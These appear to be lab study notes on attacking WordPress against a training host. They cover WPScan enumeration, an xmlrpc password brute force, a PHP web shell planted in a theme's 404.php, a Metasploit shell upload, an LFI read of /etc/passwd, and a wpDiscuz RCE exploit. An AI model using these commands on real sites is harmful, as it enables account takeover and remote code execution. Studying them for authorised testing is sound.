# Discovery / Footprinting

```shell
curl -s http://blog.inlanefreight.local | grep WordPress
```
### Robots.txt
```text
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
Look for `wp-admin` or `wp-content`
### Plugins 
* Stored in `wp-content/plugins`
* Good to enumerate vulnerable plugins
```shell
curl -s http://blog.inlanefreight.local/ | grep plugins
```
Browser to Plugin name
```HTTP
http://blog.inlanefreight.local/wp-content/plugins/<plugin-name>
```
Try and identify the version
### Themes
* Stored in `cp-content/themes`
```shell
curl -s http://blog.inlanefreight.local/ | grep themes
```
### Users
* Standard Users:
	1. Administrator
	2. Editor
	3. Author
	4. Contributor
	5. Subscriber
#### Enumerate Users
* Valid Usernames:
```txt
Error the password you entered for the username <user> is incorrect
```
* Invalid Usernames:
```txt
The Username <user> is not registered on this site. If you are unsure of your username, try your email address instead
```
## WPScan
### External Sources
[Create](https://wpscan.com/) an account and use the API token. 

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

### Normal Scan 
```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate
```
# Attacking WordPress
## Login Bruteforce
* 2 Types of brute force. [`xmlrpcs`](https://kinsta.com/blog/xmlrpc-php/) and `wp-login`. 
	1. `wp-login` tries against the login page
	2. `xmlrpc` uses wordpress API through `/xmlrpc.php`. This is faster and prefered
```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
* `--password-attack` sued to supply the type of attack 
* `-U` Takes a list of users or file
* `-P` Password or file
* `-t` threads
## Code Execution
* If you have administrative access to WordPress, you can modify the PHP source code to execute system commands. 
* Edit an uncommon page such as `404.php`
Do this in the theme editor
```php
system($_GET[0]);
```

```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

### Metasploit
```shell
use exploit/unix/webapp/wp_admin_shell_upload 
```
* Need to provide a username and password
* Needs a PHP payload
## Known Vulnerabilities 
* Most vulnerabilities are found in plugins. 
```
Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.
```
### Example vulnerable plugins
#### Mail-Masta 
* No longer supported but has had a SQL injection and LFI vulnerability since 2016.
```shell
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
#### wpDiscuz
Version 7.0.4 had a REC [vulnerability](https://www.exploit-db.com/exploits/49967)
Exploit:
```shell
 python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
Manual:
```shell
 curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
May need to clean up 
`uthsdkbywoxeebg-1629904090.8191.php`
